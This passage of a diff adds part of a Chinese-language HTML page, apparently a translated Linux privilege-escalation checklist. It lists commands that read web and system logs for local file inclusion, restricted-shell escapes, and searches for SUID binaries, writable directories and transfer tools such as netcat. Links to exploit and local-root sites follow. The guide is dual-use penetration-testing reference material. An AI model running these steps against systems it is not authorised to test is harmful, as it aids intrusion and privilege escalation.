+<span class="n">ls</span> <span class="o">-</span><span class="n">alhR</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">apache22</span><span class="o">/</span><span class="n">data</span><span class="o">/</span>
+<span class="n">ls</span> <span class="o">-</span><span class="n">alhR</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">lampp</span><span class="o">/</span><span class="n">htdocs</span><span class="o">/</span>
+<span class="n">ls</span> <span class="o">-</span><span class="n">alhR</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span>
+</pre></div>
+
+
+<h3 id="_23">有什么在日志文件里?（什么能够帮助到“本地文件包含”?)</h3>
+<div class="hlcode"><pre><span class="cp"># http:</span><span class="c1">//www.thegeekstuff.com/2011/08/linux-var-log-files/</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">httpd</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">access_log</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">httpd</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">access</span><span class="p">.</span><span class="n">log</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">httpd</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">error_log</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">httpd</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">error</span><span class="p">.</span><span class="n">log</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">access_log</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">access</span><span class="p">.</span><span class="n">log</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">error_log</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">error</span><span class="p">.</span><span class="n">log</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">apache</span><span class="o">/</span><span class="n">access_log</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">apache</span><span class="o">/</span><span class="n">access</span><span class="p">.</span><span class="n">log</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">auth</span><span class="p">.</span><span class="n">log</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">chttp</span><span class="p">.</span><span class="n">log</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">cups</span><span class="o">/</span><span class="n">error_log</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">dpkg</span><span class="p">.</span><span class="n">log</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">faillog</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">httpd</span><span class="o">/</span><span class="n">access_log</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">httpd</span><span class="o">/</span><span class="n">access</span><span class="p">.</span><span class="n">log</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">httpd</span><span class="o">/</span><span class="n">error_log</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">httpd</span><span class="o">/</span><span class="n">error</span><span class="p">.</span><span class="n">log</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">lastlog</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">lighttpd</span><span class="o">/</span><span class="n">access</span><span class="p">.</span><span class="n">log</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">lighttpd</span><span class="o">/</span><span class="n">error</span><span class="p">.</span><span class="n">log</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">lighttpd</span><span class="o">/</span><span class="n">lighttpd</span><span class="p">.</span><span class="n">access</span><span class="p">.</span><span class="n">log</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">lighttpd</span><span class="o">/</span><span class="n">lighttpd</span><span class="p">.</span><span class="n">error</span><span class="p">.</span><span class="n">log</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">messages</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">secure</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">syslog</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">wtmp</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">xferlog</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">yum</span><span class="p">.</span><span class="n">log</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">utmp</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">webmin</span><span class="o">/</span><span class="n">miniserv</span><span class="p">.</span><span class="n">log</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">access_log</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">access</span><span class="p">.</span><span class="n">log</span>
+<span class="n">ls</span> <span class="o">-</span><span class="n">alh</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">dhcp3</span><span class="o">/</span>
+<span class="n">ls</span> <span class="o">-</span><span class="n">alh</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">postgresql</span><span class="o">/</span>
+<span class="n">ls</span> <span class="o">-</span><span class="n">alh</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">proftpd</span><span class="o">/</span>
+<span class="n">ls</span> <span class="o">-</span><span class="n">alh</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">samba</span><span class="o">/</span>
+<span class="cp">#</span>
+<span class="n">auth</span><span class="p">.</span><span class="n">log</span><span class="p">,</span> <span class="n">boot</span><span class="p">,</span> <span class="n">btmp</span><span class="p">,</span> <span class="n">daemon</span><span class="p">.</span><span class="n">log</span><span class="p">,</span> <span class="n">debug</span><span class="p">,</span> <span class="n">dmesg</span><span class="p">,</span> <span class="n">kern</span><span class="p">.</span><span class="n">log</span><span class="p">,</span> <span class="n">mail</span><span class="p">.</span><span class="n">info</span><span class="p">,</span>
+
+<span class="n">mail</span><span class="p">.</span><span class="n">log</span><span class="p">,</span> <span class="n">mail</span><span class="p">.</span><span class="n">warn</span><span class="p">,</span> <span class="n">messages</span><span class="p">,</span> <span class="n">syslog</span><span class="p">,</span> <span class="n">udev</span><span class="p">,</span> <span class="n">wtmp</span><span class="p">(</span><span class="err">有什么文件</span><span class="o">?</span><span class="n">log</span><span class="p">.</span><span class="err">系统引导……</span><span class="p">)</span>
+</pre></div>
+
+
+<h3 id="_24">如果命令限制，你可以打出哪些突破它的限制？</h3>
+<div class="hlcode"><pre><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span><span class="n">import</span> <span class="n">pty</span><span class="p">;</span><span class="n">pty</span><span class="p">.</span><span class="n">spawn</span><span class="p">(</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">)</span><span class="err">&#39;</span>
+<span class="n">echo</span> <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="err">&#39;</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="err">&#39;</span><span class="p">)</span>
+<span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">-</span><span class="n">i</span>
+</pre></div>
+
+
+<h3 id="_25">如何安装文件系统？</h3>
+<div class="hlcode"><pre><span class="n">mount</span>
+<span class="n">df</span> <span class="o">-</span><span class="n">h</span>
+</pre></div>
+
+
+<h3 id="_26">是否有挂载的文件系统？</h3>
+<div class="hlcode"><pre><span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">fstab</span>
+</pre></div>
+
+
+<h3 id="linuxsticky-bits-suid-guid">什么是高级Linux文件权限使用？Sticky bits, SUID 和GUID</h3>
+<div class="hlcode"><pre><span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="mi">1000</span> <span class="o">-</span><span class="n">type</span> <span class="n">d</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>    <span class="err">#</span> <span class="n">Sticky</span> <span class="n">bit</span> <span class="o">-</span> <span class="n">Only</span> <span class="n">the</span> <span class="n">owner</span> <span class="n">of</span> <span class="n">the</span> <span class="n">directory</span> <span class="n">or</span> <span class="n">the</span> <span class="n">owner</span> <span class="n">of</span> <span class="n">a</span> <span class="n">file</span> <span class="n">can</span> <span class="n">delete</span> <span class="n">or</span> <span class="n">rename</span> <span class="n">here</span>
+<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">g</span><span class="o">=</span><span class="n">s</span> <span class="o">-</span><span class="n">type</span> <span class="n">f</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>    <span class="err">#</span> <span class="n">SGID</span> <span class="p">(</span><span class="n">chmod</span> <span class="mi">2000</span><span class="p">)</span> <span class="o">-</span> <span class="n">run</span> <span class="n">as</span> <span class="n">the</span>  <span class="n">group</span><span class="p">,</span> <span class="n">not</span> <span class="n">the</span> <span class="n">user</span> <span class="n">who</span> <span class="n">started</span> <span class="n">it</span><span class="p">.</span>
+<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">u</span><span class="o">=</span><span class="n">s</span> <span class="o">-</span><span class="n">type</span> <span class="n">f</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>    <span class="err">#</span> <span class="n">SUID</span> <span class="p">(</span><span class="n">chmod</span> <span class="mi">4000</span><span class="p">)</span> <span class="o">-</span> <span class="n">run</span> <span class="n">as</span> <span class="n">the</span>  <span class="n">owner</span><span class="p">,</span> <span class="n">not</span> <span class="n">the</span> <span class="n">user</span> <span class="n">who</span> <span class="n">started</span> <span class="n">it</span><span class="p">.</span>
+<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">g</span><span class="o">=</span><span class="n">s</span> <span class="o">-</span><span class="n">o</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">u</span><span class="o">=</span><span class="n">s</span> <span class="o">-</span><span class="n">type</span> <span class="n">f</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>    <span class="err">#</span> <span class="n">SGID</span> <span class="n">or</span> <span class="n">SUID</span>
+<span class="k">for</span> <span class="n">i</span> <span class="n">in</span> <span class="err">`</span><span class="n">locate</span> <span class="o">-</span><span class="n">r</span> <span class="s">&quot;bin$&quot;</span><span class="err">`</span><span class="p">;</span> <span class="k">do</span> <span class="n">find</span> <span class="err">$</span><span class="n">i</span> <span class="p">(</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="mi">4000</span> <span class="o">-</span><span class="n">o</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="mi">2000</span> <span class="p">)</span> <span class="o">-</span><span class="n">type</span> <span class="n">f</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span><span class="p">;</span> <span class="n">done</span>    <span class="err">#</span>
+<span class="n">Looks</span> <span class="n">in</span> <span class="o">&amp;</span><span class="err">#</span><span class="mo">03</span><span class="mi">9</span><span class="p">;</span><span class="n">common</span><span class="o">&amp;</span><span class="err">#</span><span class="mo">03</span><span class="mi">9</span><span class="p">;</span> <span class="n">places</span><span class="o">:</span> <span class="o">/</span><span class="n">bin</span><span class="p">,</span> <span class="o">/</span><span class="n">sbin</span><span class="p">,</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="p">,</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">,</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span><span class="p">,</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span> <span class="n">and</span> <span class="n">any</span> <span class="n">other</span> <span class="o">*</span><span class="n">bin</span><span class="p">,</span> <span class="k">for</span> <span class="n">SGID</span> <span class="n">or</span> <span class="n">SUID</span>
+<span class="p">(</span><span class="n">Quicker</span> <span class="n">search</span><span class="p">)</span>
+<span class="cp">#</span>
+<span class="n">findstarting</span> <span class="n">at</span> <span class="n">root</span> <span class="p">(</span><span class="o">/</span><span class="p">),</span> <span class="n">SGIDorSUID</span><span class="p">,</span> <span class="n">not</span> <span class="n">Symbolic</span> <span class="n">links</span><span class="p">,</span> <span class="n">only</span> <span class="mi">3</span>
+<span class="n">folders</span> <span class="n">deep</span><span class="p">,</span> <span class="n">list</span> <span class="n">with</span> <span class="n">more</span> <span class="n">detail</span> <span class="n">and</span> <span class="n">hideany</span> <span class="n">errors</span> <span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">g</span><span class="p">.</span> <span class="n">permission</span>
+<span class="n">denied</span><span class="p">)</span>
+<span class="n">find</span><span class="o">/-</span><span class="n">perm</span> <span class="o">-</span><span class="n">g</span><span class="o">=</span><span class="n">s</span><span class="o">-</span><span class="n">o</span><span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="mi">4000</span><span class="o">!</span> <span class="o">-</span><span class="n">type</span> <span class="n">l</span><span class="o">-</span><span class="n">maxdepth</span> <span class="mi">3</span> <span class="o">-</span><span class="n">exec</span> <span class="n">ls</span> <span class="o">-</span><span class="n">ld</span> <span class="p">{}</span> <span class="p">;</span><span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
+</pre></div>
+
+
+<h3 id="tmpvar-tmp-dev-shm">在哪些目录可以写入和执行呢？几个“共同”的目录：/ tmp目录，/var / tmp目录/ dev /shm目录</h3>
+<div class="hlcode"><pre><span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">writable</span> <span class="o">-</span><span class="n">type</span> <span class="n">d</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>        <span class="err">#</span> <span class="n">world</span><span class="o">-</span><span class="n">writeable</span> <span class="n">folders</span>
+<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="mi">222</span> <span class="o">-</span><span class="n">type</span> <span class="n">d</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>      <span class="err">#</span> <span class="n">world</span><span class="o">-</span><span class="n">writeable</span> <span class="n">folders</span>
+<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">o</span><span class="o">+</span><span class="n">w</span> <span class="o">-</span><span class="n">type</span> <span class="n">d</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>    <span class="err">#</span> <span class="n">world</span><span class="o">-</span><span class="n">writeable</span> <span class="n">folders</span>
+<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">o</span><span class="o">+</span><span class="n">x</span> <span class="o">-</span><span class="n">type</span> <span class="n">d</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>    <span class="err">#</span> <span class="n">world</span><span class="o">-</span><span class="n">executable</span> <span class="n">folders</span>
+<span class="n">find</span> <span class="o">/</span> <span class="p">(</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">o</span><span class="o">+</span><span class="n">w</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">o</span><span class="o">+</span><span class="n">x</span> <span class="p">)</span> <span class="o">-</span><span class="n">type</span> <span class="n">d</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>   <span class="err">#</span> <span class="n">world</span><span class="o">-</span><span class="n">writeable</span> <span class="o">&amp;</span> <span class="n">executable</span> <span class="n">folders</span>
+<span class="n">Any</span> <span class="s">&quot;problem&quot;</span> <span class="n">files</span><span class="err">？可写的的，“没有使用</span><span class="s">&quot;的文件</span>
+<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">xdev</span> <span class="o">-</span><span class="n">type</span> <span class="n">d</span> <span class="p">(</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="mo">0002</span> <span class="o">-</span><span class="n">a</span> <span class="o">!</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="mi">1000</span> <span class="p">)</span> <span class="o">-</span><span class="n">print</span>   <span class="err">#</span> <span class="n">world</span><span class="o">-</span><span class="n">writeable</span> <span class="n">files</span>
+<span class="n">find</span> <span class="o">/</span><span class="n">dir</span> <span class="o">-</span><span class="n">xdev</span> <span class="p">(</span> <span class="o">-</span><span class="n">nouser</span> <span class="o">-</span><span class="n">o</span> <span class="o">-</span><span class="n">nogroup</span> <span class="p">)</span> <span class="o">-</span><span class="n">print</span>   <span class="err">#</span> <span class="n">Noowner</span> <span class="n">files</span>
+</pre></div>
+
+
+<h2 id="_27">准备和查找漏洞利用代码</h2>
+<h3 id="_28">安装了什么开发工具/语言/支持？</h3>
+<div class="hlcode"><pre><span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">name</span> <span class="n">perl</span><span class="o">*</span>
+<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">name</span> <span class="n">python</span><span class="o">*</span>
+<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">name</span> <span class="n">gcc</span><span class="o">*</span>
+<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">name</span> <span class="n">cc</span>
+</pre></div>
+
+
+<h3 id="_29">如何上传文件？</h3>
+<div class="hlcode"><pre><span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">name</span> <span class="n">wget</span>
+<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">name</span> <span class="n">nc</span><span class="o">*</span>
+<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">name</span> <span class="n">netcat</span><span class="o">*</span>
+<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">name</span> <span class="n">tftp</span><span class="o">*</span>
+<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">name</span> <span class="n">ftp</span>
+</pre></div>
+
+
+<h3 id="exploit">查找exploit代码</h3>
+<p>http://www.exploit-db.com</p>
+<p>http://1337day.com</p>
+<p>http://www.securiteam.com</p>
+<p>http://www.securityfocus.com</p>
+<p>http://www.exploitsearch.net</p>
+<p>http://metasploit.com/modules/</p>
+<p>http://securityreason.com</p>
+<p>http://seclists.org/fulldisclosure/</p>
+<p>http://www.google.com</p>
+<p>查找更多有关漏洞的信息</p>
+<p>http://www.cvedetails.com</p>
+<p>http://packetstormsecurity.org/files/cve/[CVE]</p>
+<p>http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]]http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]</p>
+<p>http://www.vulnview.com/cve-details.php?cvename=[CVE]]http://www.vulnview.com/cve-details.php?cvename=[CVE]</p>
+<p>http://www.91ri.org/</p>
+<p>(快速）“共同的“exploit,预编译二进制代码文件</p>
+<p>http://tarantula.by.ru/localroot/</p>
+<p>http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/</p>
+<p>上面的信息很难吗？</p>
+<p>快去使用第三方脚本/工具来试试吧！</p>
+<h3 id="web">系统怎么打内核，操作系统，所有应用程序，插件和Web服务的最新补丁？</h3>
+<div class="hlcode"><pre><span class="n">apt</span><span class="o">-</span><span class="n">get</span> <span class="n">update</span> <span class="o">&amp;&amp;</span> <span class="n">apt</span><span class="o">-</span><span class="n">get</span> <span class="n">upgrade</span>
+<span class="n">yum</span> <span class="n">update</span>
+</pre></div>
+
+
+<h3 id="_30">服务运行所需的最低的权限？</h3>
+<p>例如，你需要以root身份运行MySQL？</p>
+<p>能够从以下网站找到自动运行的脚本？！</p>
+<p>http://pentestmonkey.net/tools/unix-privesc-check/</p>
+<p>http://labs.portcullis.co.uk/application/enum4linux/</p>
+<p>http://bastille-linux.sourceforge.net</p>
+<p>（快速）指南和链接</p>
+<p>例如</p>
+<p>http://www.0daysecurity.com/penetration-testing/enumeration.html</p>
+<p>http://www.microloft.co.uk/hacking/hacking3.htm</p>
+<p>其他</p>
+<p>http://jon.oberheide.org/files/stackjacking-infiltrate11.pdf</p>
+<p>http://pentest.cryptocity.net/files/clientsides/post_exploitation_fall09.pdf</p>
+<p>http://insidetrust.blogspot.com/2011/04/quick-guide-to-linux-privilege.html</p>
+</div>
+
+        </div>
+        <div id="footer">
+            <span>
+                Copyright © 2012-2016 .
+                Powered by <a href="http://simiki.org/" target="_blank">Simiki</a>.
+            </span>
+        </div>
+        
+    </body>
+</html>
